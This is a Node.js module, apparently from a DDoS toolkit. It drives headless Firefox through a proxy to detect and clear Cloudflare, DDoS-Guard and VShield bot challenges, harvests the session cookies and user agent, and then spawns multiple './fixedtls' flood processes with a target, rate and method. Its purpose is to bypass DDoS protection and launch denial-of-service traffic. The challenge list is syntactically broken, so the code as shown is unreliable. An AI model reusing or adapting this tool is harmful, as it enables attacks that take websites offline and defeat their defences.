const playwright = require('playwright');
const colors = require('colors');
const {
    spawn
} = require('child_process');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
  "TimeoutError",
  "DeprecationWarning",
]),
  (ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
	'NS_ERROR_CONNECTION_REFUSED',
    "DEP0123",
    "ERR_SSL_WRONG_VERSION_NUMBER",
  ]);

process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });
const JSList = {
	"js": [{
		"name": "CloudFlare (Secure JS)",
		"navigations": 2,
		"locate": "<h2 class=\"h2\" id=\"challenge-running\">"
	},
	{
		"name": "CloudFlare (Normal JS)",
		"navigations": 2,
		"locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
	},
	}, {
		"name": "DDoS-Guard",
		"navigations": 1,
		"locate": "document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;"
	}, {]
}

function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}

function log(string) {
	let d = new Date();
	let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
	console.log(`(${hours}:${minutes}:${seconds}) - ${string}`);
}

function randomIntFromInterval(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min)
}

function cookiesToStr(cookies) {
	if (Array.isArray(cookies)) {
		return cookies.reduce((prev, {
			name,
			value
		}) => {
			if (!prev) return `${name}=${value}`;
			return `${prev}; ${name}=${value}`;
		}, "");
		return "";
	}
}

function JSDetection(argument) {
	for (let i = 0; i < JSList['js'].length; i++) {
		if (argument.includes(JSList['js'][i].locate)) {
			return JSList['js'][i]
		}
	}
}

function solverInstance(args) {
	return new Promise((resolve, reject) => {
		log('(' + 'PlayWright'.cyan + `)`.white + ` Launching Playwright Instance.`.green);
		playwright.firefox.launch({
			headless: true,

			proxy: {
				server: 'http://' + args.Proxy
			},
		}).then(async (browser) => {

			const page = await browser.newPage();

			try {
				await page.goto(args.Target);
			} catch (e) {

				await browser.close();
				reject(e);
			}

			const ua = await page.evaluate(
				() => navigator.userAgent
			);
			log('(' + 'PlayWright'.cyan + `)` + ' PlayWright Assigned UA: '.yellow + `${ua}`.green);			
			const source = await page.content();
			const title = await page.title()
			const JS = await JSDetection(source);
			if(title == "Access denied")
			{
				log('(' + 'JSDetect'.red + `)` + ' Access to the page was denied. ');	
			}
			if (JS) {
				log('(' + 'JSDetect'.green + `)` + ' Detected JS Challenge: '.magenta + `(${JS.name})`.yellow);			
				if (JS.name == "VShield") {
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.down();
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
					await page.mouse.up();
				}

				for (let i = 0; i < JS.navigations; i++) {
					var [response] = await Promise.all([
						page.waitForNavigation(),
					])
					log('(' + 'Navigations'.green + `) Browsers Waiting Navigation: ` + `${i}`.magenta);
				}
			} else {
			}
			const title2 = await page.title()
			const source2 = await page.content();
			const JS2 = await JSDetection(source2);
			if(title2 == "Access denied")
			{
				log('(' + 'JSDetect'.red + `)` + ' Access to the page was denied. ');	
			}
			if (JS2) {
				log('(' + 'JSDetect'.green + `)` + ' Detected JS Challenge:' + `(${JS2.name})`.yellow);			

				if (JS2.name == "VShield") {
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.down();
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
					await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
					await page.mouse.up();
				}

				for (let i = 0; i < JS2.navigations; i++) {
					var [response] = await Promise.all([
						page.waitForNavigation(),
					])
					log('(' + 'Navigations'.green + `) Passed navigation ID: ` + `[${i + 1}/${JS.navigations}]`.magenta);
					}
			} else {
			}			


			const cookies = cookiesToStr(await page.context().cookies());
			const titleParsed = await page.title();
			log('(' + 'Harvester'.green + ') Page Title: ' + `${titleParsed}`);
            log('(' + 'Harvester'.green + ') Parsed Cookie: ' + `${cookies}`.yellow);
			for (let i = 0; i < args.Threads; i++) {
                spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
            }
			log('(' + 'PlayWright'.green + `) Session Solved.`);
			resolve(cookies);
		})
	})
}

module.exports = {
	solverInstance: solverInstance
};